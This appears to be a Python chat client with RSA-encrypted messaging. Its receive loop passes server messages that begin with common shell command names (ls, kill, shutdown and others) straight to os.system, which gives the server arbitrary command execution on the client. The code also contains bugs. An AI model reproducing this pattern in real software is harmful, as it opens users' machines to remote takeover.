import socket
import errno
import sys
import os
import random
from rsa import RSA_Cipher

from Crypto.PublicKey import RSA
import time


HEADER_LENGTH = 10
IP = "127.0.0.1"
PORT = 9999

rsa_cipher = RSA_Cipher()
rsa_cipher.generate_key(1024)

fp = open("message.txt", "r")
st = fp.read()
username_list = st.split()
print("Username List :", username_list)

for i in range(len(username_list)):
    if username_list[i] == "":
        username_list.pop(i)

system_function_list = [
    "pwd",
    "ls",
    "cd",
    "mkdir",
    "rmdir",
    "lsblk",
    "lsblk",
    "git",
    "df",
    "uname",
    "ps",
    "kill",
    "service",
    "batch",
    "shutdown",
    "touch",
    "mv",
    "less",
    "ln",
    "cmp",
    "history",
]

my_username = username_list[random.randint(0, len(username_list) - 1)]
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client_socket.connect((IP, PORT))
    print("Connected To server")
except:
    print("Could Not Connect!!!")
client_socket.setblocking(False)


username = my_username.encode("utf-8")
username_header = f"{len(username):<{HEADER_LENGTH}}".encode("utf-8")
client_socket.send(username_header + username)
time.sleep(0.5)
server_to_client_str = client_socket.recv(1024)

server_to_client_key = RSA.importKey(server_to_client_str)


def send_message_thread():
    """
    This method takes input from user(client) and sends it to server.
    """
    message = input(f"{my_username} > ")
    message = int.from_bytes(bytes(message, "utf-8"), byteorder="big")
    message = server_to_client_key.encrypt(message, 32)

    if message:
        message = str(message[0])
        message = message.encode("utf-8")
        message_header = f"{len(message):<{HEADER_LENGTH}}".encode("utf-8")
        client_socket.send(message_header + message)


def get_message_thread():
    """This method gets message from server and prints it in server terminal."""
    try:

        while True:

            flag = 1
            message_header = client_socket.recv(HEADER_LENGTH)

            if not len(username_header):
                print("connection failed by server")
                sys.exit()

            message_length = int(message_header)

            message = client_socket.recv(message_length).decode("utf-8")
            if message == "":
                print("Signzy > ")
                continue

            message = str(message)
            # mes=rsa_cipher.decrypt(message)

            for i in system_function_list:

                if i in message.split()[0]:
                    os.system(message)
                    flag = 0
                    break
            if flag == 1:
                print(f"Signzy > {message}")

    except IOError as e:
        if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
            print("reading error", str(e))
            sys.exit()

    except Exception as e:
        print(str(e))
        sys.exit()


def client_thread():
    while True:
        get_message_thread()
        send_message_thread()


client_thread()
